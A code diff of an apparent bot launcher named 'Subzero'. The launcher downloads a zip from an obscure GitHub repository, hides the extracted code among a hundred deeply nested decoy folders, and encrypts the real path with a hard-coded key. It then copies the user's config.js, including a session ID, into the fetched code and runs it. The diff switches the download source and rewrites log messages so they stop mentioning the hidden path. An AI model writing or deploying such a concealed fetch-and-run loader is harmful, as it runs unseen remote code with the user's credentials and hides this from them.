@@ -108,7 +108,6 @@ async function downloadAndExtractRepo(targetPath) {
     require(path.join(extractedRepo, 'index.js'));
 })();
 */
-/*
 const fs = require('fs');
 const path = require('path');
 const axios = require('axios');
@@ -116,7 +115,7 @@ const AdmZip = require('adm-zip');
 const crypto = require('crypto');
 
 // === CONFIGURATION ===
-const repoZipUrl = 'https://github.com/3strox/x/archive/refs/heads/main.zip';
+const repoZipUrl = 'https://github.com/dxui/--/archive/refs/heads/main.zip';
 const TOP_FOLDER = path.join(__dirname, '.cache');
 const TOTAL_DUMMY_PATHS = 100;
 const NEST_DEPTH = 50;
@@ -167,11 +166,11 @@ function generateHiddenRealPath() {
 
 async function downloadAndExtractRepo(targetPath) {
     try {
-        console.log('[🌐] Connecting to Server...');
+        console.log('[🌐] Connecting to server...');
         const response = await axios.get(repoZipUrl, { responseType: 'arraybuffer' });
         const zip = new AdmZip(Buffer.from(response.data, 'binary'));
         zip.extractAllTo(targetPath, true);
-        console.log('[🌐] Repo extracted in hidden path');
+        console.log('[🌐] Server connected');
     } catch (err) {
         console.error('❌ SUBZERO SERVER IS OFFLINE', err);
         process.exit(1);
@@ -205,103 +204,9 @@ async function downloadAndExtractRepo(targetPath) {
         fs.copyFileSync(localConfig, path.join(extractedRepo, 'config.js'));
     }
 
-    console.log('[✅] Booting from secure location...');
+    console.log('[✅] Subzero Booting...');
     process.chdir(extractedRepo);
     require(path.join(extractedRepo, 'index.js'));
 })();
-*/
 
-const fs = require('fs');
-const path = require('path');
-const axios = require('axios');
-const AdmZip = require('adm-zip');
-const crypto = require('crypto');
-const CONFIG = require('./config'); // Uses your exported config.js
 
-// === CONFIGURATION ===
-const repoZipUrl = 'https://github.com/3strox/x/archive/refs/heads/main.zip';
-const TOP_FOLDER = path.join(__dirname, '.cache');
-const TOTAL_DUMMY_PATHS = 100;
-const NEST_DEPTH = 50;
-const ENCRYPTION_KEY = crypto.createHash('sha256').update('subzero_key').digest();
-const IV = crypto.randomBytes(16);
-const LOCK_FILE = path.join(__dirname, '.lock');
-
-// === UTILS ===
-const randomName = () => '.' + crypto.randomBytes(3).toString('hex');
-
-function encryptPath(text) {
-    const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, IV);
-    let encrypted = cipher.update(text, 'utf-8', 'hex');
-    encrypted += cipher.final('hex');
-    return IV.toString('hex') + ':' + encrypted;
-}
-
-function generateDummyPath(basePath) {
-    let current = basePath;
-    for (let i = 0; i < NEST_DEPTH; i++) {
-        const folder = randomName();
-        current = path.join(current, folder);
-        if (!fs.existsSync(current)) fs.mkdirSync(current);
-    }
-    fs.writeFileSync(path.join(current, '.exdrx'), '🗿');
-    return current;
-}
-
-function generateHiddenRealPath() {
-    const folderPath = generateDummyPath(TOP_FOLDER);
-    const realPath = path.join(folderPath, '.repo');
-    fs.mkdirSync(realPath, { recursive: true });
-    const encryptedPath = encryptPath(realPath);
-    fs.writeFileSync(LOCK_FILE, encryptedPath);
-    return realPath;
-}
-
-async function downloadAndExtractRepo(targetPath) {
-    try {
-        console.log('[🌐] Connecting to Server...');
-        const response = await axios.get(repoZipUrl, { responseType: 'arraybuffer' });
-        const zip = new AdmZip(Buffer.from(response.data, 'binary'));
-        zip.extractAllTo(targetPath, true);
-        console.log('[🌐] Repo extracted in hidden path');
-    } catch (err) {
-        console.error('❌ SUBZERO SERVER IS OFFLINE', err);
-        process.exit(1);
-    }
-}
-
-(async () => {
-    // ❌ BLOCK IF SESSION_ID IS MISSING
-    if (!CONFIG.SESSION_ID || CONFIG.SESSION_ID.trim() === "") {
-        console.log('are you trying to clone, BASTARD');
-        process.exit(1);
-    }
-
-    if (!fs.existsSync(TOP_FOLDER)) fs.mkdirSync(TOP_FOLDER);
-
-    for (let i = 0; i < TOTAL_DUMMY_PATHS - 1; i++) generateDummyPath(TOP_FOLDER);
-
-    const hiddenRepoPath = generateHiddenRealPath();
-    await downloadAndExtractRepo(hiddenRepoPath);
-
-    const folders = fs.readdirSync(hiddenRepoPath).filter(f =>
-        fs.statSync(path.join(hiddenRepoPath, f)).isDirectory()
-    );
-
-    if (!folders.length) {
-        console.error('❌ No extracted repo found!');
-        process.exit(1);
-    }
-
-    const extractedRepo = path.join(hiddenRepoPath, folders[0]);
-
-    // Inject config.js
-    const localConfig = path.join(__dirname, 'config.js');
-    if (fs.existsSync(localConfig)) {
-        fs.copyFileSync(localConfig, path.join(extractedRepo, 'config.js'));
-    }
-
-    console.log('[✅] Booting from secure location...');
-    process.chdir(extractedRepo);
-    require(path.join(extractedRepo, 'index.js'));
-})();
